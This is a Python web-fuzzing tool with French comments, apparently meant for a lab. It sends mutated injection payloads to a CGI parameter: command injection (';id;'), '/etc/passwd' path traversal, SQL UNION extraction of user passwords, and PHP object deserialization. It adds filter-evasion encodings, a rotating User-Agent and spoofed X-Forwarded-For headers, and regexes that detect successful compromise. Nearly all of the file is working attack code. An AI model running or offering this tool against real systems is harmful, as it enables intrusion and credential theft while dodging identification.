#!/usr/bin/env python3
# HARNESS-VALIDATION v2.4.0 — fuzzer d'envoi avec rotation d'identité.
# Corrige audit §3.10 :
#   - Mutation \uXXXX corrigée (caractères réels, pas escapes littéraux)
#   - Concurrence via ThreadPoolExecutor (4 workers)
#   - hint() affiné (regex au lieu de substring)
import base64
import concurrent.futures
import json
import os
import random
import re
import sys
import time
import urllib.parse as up
import requests

# v2.4 : configuration via environnement (rate limiting reproductible)
MAX_WORKERS = int(os.environ.get("FUZZER_WORKERS", "4"))
DELAY_MS = float(os.environ.get("FUZZER_DELAY_MS", "0"))

BASES = {
    "php_unserialize": 'O:10:"TriggerUAF":1:{s:2:"ry";O:8:"stdClass":0:{}}',
    "cmd_inject":      ';id;',
    "path_traversal":  '../../../../etc/passwd',
    "sqli_union":      "' UNION SELECT user,pass FROM users-- -",
}
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "curl/7.68.0",
    "python-requests/2.28",
    "Mozilla/5.0 (X11; Linux x86_64)",
]

# Regex de détection affinés (évite faux positifs)
HINT_PATTERNS = [
    (re.compile(r"uid=\d+\(", re.I), "LFI_OR_RCE"),
    (re.compile(r"root:x:0:"), "LFI_OR_RCE"),
    (re.compile(r"SQL syntax|mysql_fetch|ORA-\d{5}", re.I), "SQLI_ERROR"),
    (re.compile(r"Warning.*unserialize\(\).*error", re.I), "PHP_UNSERIALIZE"),
    (re.compile(r"<b>Warning</b>.*\bsymlink\b", re.I), "PHP_NOTICE"),
]


def hint(text: str) -> str | None:
    for pat, label in HINT_PATTERNS:
        if pat.search(text):
            return label
    return None


def mutate(base: str, rng: random.Random, rounds: int = 3) -> list[str]:
    ops = [
        lambda s: up.quote(s, safe=rng.choice(["", ":/", ";"])),
        lambda s: up.quote(up.quote(s, safe=""), safe=""),
        # Mutation Unicode corrigée : génère le CARACTÈRE réel encodé UTF-8
        # (pas l'escape littéral \uXXXX que les serveurs n'interprètent pas)
        lambda s: "".join(
            chr(ord(c) + 0xFEE0) if rng.random() < 0.2 and c.isascii()
            else c
            for c in s
        ),
        lambda s: s.replace(";", "%00;").replace(" ", "%09"),
        lambda s: "base64:" + base64.b64encode(s.encode()).decode(),
    ]
    cur = [base]
    for _ in range(rounds):
        nxt = []
        for p in cur:
            for op in rng.sample(ops, k=rng.randint(1, 3)):
                try:
                    nxt.append(op(p))
                except Exception:
                    pass
        # v2.4 : déduplication simple (set de hashes, pas de sha256 par payload)
        seen, cur = set(), []
        for p in nxt:
            if p not in seen:
                seen.add(p)
                cur.append(p)
        # v2.4 : sélection avec diversité (varier les longueurs, pas seulement les premières)
        cur.sort(key=lambda p: len(p))
        cur = cur[::max(1, len(cur)//32)][:32]  # échantillonnage distribué par longueur
    return cur


def send_one(url: str, payload: str, ua: str, xff: str) -> dict | None:
    try:
        if DELAY_MS > 0:
            time.sleep(DELAY_MS / 1000)
        r = requests.get(
            url, params={"device_id": payload},
            headers={"User-Agent": ua, "X-Forwarded-For": xff},
            timeout=5, allow_redirects=False,
        )
        h = hint(r.text)
        if h:
            return {
                "payload": payload[:100],
                "hint": h,
                "status": r.status_code,
                "len": len(r.content),
            }
    except requests.RequestException:
        pass
    return None


def main():
    url = (sys.argv[1] if len(sys.argv) > 1
           else "http://127.0.0.1:8080/cgi-bin/admin.cgi")
    seed = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
    rng = random.Random(seed)

    payloads = []
    for b in BASES.values():
        payloads += mutate(b, rng)

    # Génération des identités rotatives
    identities = [
        (rng.choice(UAS),
         f"{rng.randint(1, 254)}.{rng.randint(0, 254)}."
         f"{rng.randint(0, 254)}.{rng.randint(1, 254)}")
        for _ in payloads
    ]

    hits = []
    # Concurrence : workers configurables (limité pour ne pas DoS le lab)
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        futures = [
            pool.submit(send_one, url, p, ua, xff)
            for p, (ua, xff) in zip(payloads, identities)
        ]
        # v2.4 : collecter dans l'ordre d'envoi (reproductibilité du rapport)
        for fut in futures:  # pas as_completed — ordre déterministe
            result = fut.result()
            if result:
                hits.append(result)

    print(json.dumps({
        "module": "fuzzer_send",
        "seed": seed,
        "total": len(payloads),
        "hits": hits,
        "hits_count": len(hits),
    }, indent=2))


if __name__ == "__main__":
    main()
